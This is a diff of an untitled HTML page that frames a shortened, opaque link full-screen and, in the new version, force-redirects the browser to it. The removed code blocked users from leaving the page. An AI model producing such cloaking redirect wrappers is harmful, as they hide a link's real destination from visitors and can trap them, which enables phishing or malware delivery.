@@ -1,31 +1,18 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <!-- ✅ MOBILE CRITICAL: Perfect fit, no zoom, full width -->
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-capable" content="yes">
     <title></title>
     <style>
-        * {
+        html, body {
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-        }
-        html, body {
             width: 100%;
             height: 100%;
-            overflow: hidden; /* No scrollbars */
-            background: #000000; /* Solid background while loading */
-            position: fixed; /* Prevent mobile bounce/scrolling */
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
+            overflow: hidden;
+            background: #000000;
         }
-        /* ✅ FORCES IFRAME TO FILL 100% MOBILE SCREEN — NO GAPS, NO BORDERS */
-        #mainFrame {
+        iframe {
             position: absolute;
             top: 0;
             left: 0;
@@ -34,29 +21,18 @@
             border: none;
             margin: 0;
             padding: 0;
-            display: block;
-            overflow: auto; /* Let iframe content scroll if needed */
-            -webkit-overflow-scrolling: touch; /* Smooth iOS scroll */
         }
     </style>
 </head>
 <body>
-
-    <!-- ✅ YOUR LINK OPENS **STRICTLY INSIDE THIS IFRAME** — NO REDIRECTS, NO PROMPTS -->
-    <iframe id="mainFrame" src="https://shorturl.at/BrtRo" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+    <!-- Loads your URL DIRECTLY inside the page — NO prompts, NO popups, NO questions -->
+    <iframe src="https://shorturl.at/BrtRo"></iframe>
 
     <script>
-        // ✅ PREVENTS ANY EXTERNAL REDIRECT — FORCES EVERYTHING INSIDE IFRAME
-        window.onbeforeunload = function(e) {
-            e.preventDefault();
-            return false;
-        };
-
-        // ✅ DOUBLE-ENSURE: Iframe is always active, never replaced
-        document.getElementById('mainFrame').onload = function() {
-            history.replaceState({}, document.title, window.location.href);
+        // Backup force-load (in case iframe is blocked by browser)
+        window.onload = function() {
+            window.location.replace("https://shorturl.at/BrtRo");
         };
     </script>
-
 </body>
 </html>
